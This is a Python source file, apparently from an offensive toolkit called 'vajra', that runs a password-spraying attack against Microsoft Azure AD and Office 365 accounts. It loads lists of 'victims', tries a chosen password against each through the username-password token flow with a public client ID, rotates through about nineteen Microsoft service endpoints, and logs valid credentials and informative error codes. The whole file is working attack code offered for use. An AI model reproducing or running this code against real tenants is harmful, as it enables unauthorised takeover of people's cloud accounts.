

import adal
from sqlalchemy.sql.expression import false, true
from vajra import db
from sqlalchemy.sql import text
from vajra.models import AddedVictims, StealerConfig, sprayingConfig, sprayingLogs, sprayingResult, Allusers, AttackStatus


class sprayingAttack():
    def spray(uuid, password, endpoint, victim):
        try:
            context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None, proxies=None, verify_ssl=True)
            context.acquire_token_with_username_password(endpoint, victim, password, '1b730954-1685-4b74-9bfd-dac224a7b894')

            db.session.add(sprayingResult(uuid=uuid, victim=victim, password=password, errorCode="", message="", endpoint=endpoint))
            message = f"Spraying: <br><span style=\"color:#7FFFD4\">[+] {victim} : {password}</span>" 
            db.session.add(sprayingLogs(uuid=uuid, message=message))
            
            try:
                db.session.commit()
            except:
                db.session.rollback()
            return true

        except adal.adal_error.AdalError as e:
            try:
                error_code = e.error_response['error_codes'][0]
                error_description = e.error_response['error_description']
                message = error_description.split("\n")[0]
                if error_code != 50126:
                    errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
                    db.session.add(sprayingLogs(uuid=uuid, message=errorLog))
                    db.session.commit()

                    db.session.add(sprayingResult(uuid=uuid, victim=victim, password=password, errorCode=error_code, message=message, endpoint=endpoint))
                    try:
                        db.session.commit()
                    except:
                        db.session.rollback()
                    return true

            except TypeError as f:
                print(e)

                
                
    def startAttack(uuid):
        #db.engine.execute(text("UPDATE attack_status SET spraying ='True' WHERE uuid = :uuid"), uuid=uuid)
        attack_status = AttackStatus.query.filter_by(uuid=uuid).first()
        attack_status.spraying = "True"
        db.session.commit()
        endpoints = [
            ["aad_graph_api", "https://graph.windows.net"],
            ["ms_graph_api", "https://graph.microsoft.com"],
            ["azure_mgmt_api", "https://management.azure.com"],
            ["windows_net_mgmt_api", "https://management.core.windows.net"],
            ["cloudwebappproxy", "https://proxy.cloudwebappproxy.net/registerapp"],
            ["officeapps", "https://officeapps.live.com"],
            ["outlook", "https://outlook.office365.com"],
            ["webshellsuite", "https://webshell.suite.office.com"],
            ["sara", "https://api.diagnostics.office.com"],
            ["office_mgmt", "https://manage.office.com"],
            ["msmamservice", "https://msmamservice.api.application"],
            ["spacesapi", "https://api.spaces.skype.com"],
            ["datacatalog", "https://datacatalog.azure.com"],
            ["database", "https://database.windows.net"],
            ["AzureKeyVault", "https://vault.azure.net"],
            ["onenote", "https://onenote.com"],
            ["o365_yammer", "https://api.yammer.com"],
            ["skype4business", "https://api.skypeforbusiness.com"],
            ["o365_exchange", "https://outlook-sdf.office.com"]
            ]
        victims = Allusers.query.filter_by(uuid=uuid).all()
        getconfig = sprayingConfig.query.filter_by(uuid=uuid).first()
        advanceSpray = getconfig.advanceSpray
        if getconfig.password != "":
            password = getconfig.password

        if getconfig.customVictims == "checked":
            victims = AddedVictims.query.filter_by(uuid=uuid).all()
            message = "<br><span style=\"color:#7FFFD4\">[+] Custom victim Enabled</span>"
            db.session.add(sprayingLogs(uuid=uuid, message=message))
            db.session.commit()
            
        for victim in victims:
            victim = victim.userPrincipalName
            db.session.query(sprayingResult).filter_by(uuid=uuid, victim=victim).delete()
            if "#EXT#" in victim:
                continue
            if advanceSpray == "checked":
                for endpoint in endpoints:
                    endpoint = endpoint[1]
                    message = f"<br><span style=\"color:yellow\">[!] {victim} : {endpoint}</span>"
                    db.session.add(sprayingLogs(uuid=uuid, message=message))
                    db.session.commit()
                    res = sprayingAttack.spray(uuid, password, endpoint, victim)
                    if res == true:
                        break

            if advanceSpray == "":
                endpoint = endpoints[1][1]
                message = f"<br><span style=\"color:yellow\">[!] {victim}</span>"
                db.session.add(sprayingLogs(uuid=uuid, message=message))
                db.session.commit()
                res = sprayingAttack.spray(uuid, password, endpoint, victim)

#        db.engine.execute(text("UPDATE attack_status SET spraying ='False' WHERE uuid = :uuid"), uuid=uuid)
        attack_status = AttackStatus.query.filter_by(uuid=uuid).first()
        attack_status.spraying = "False"
        db.session.commit()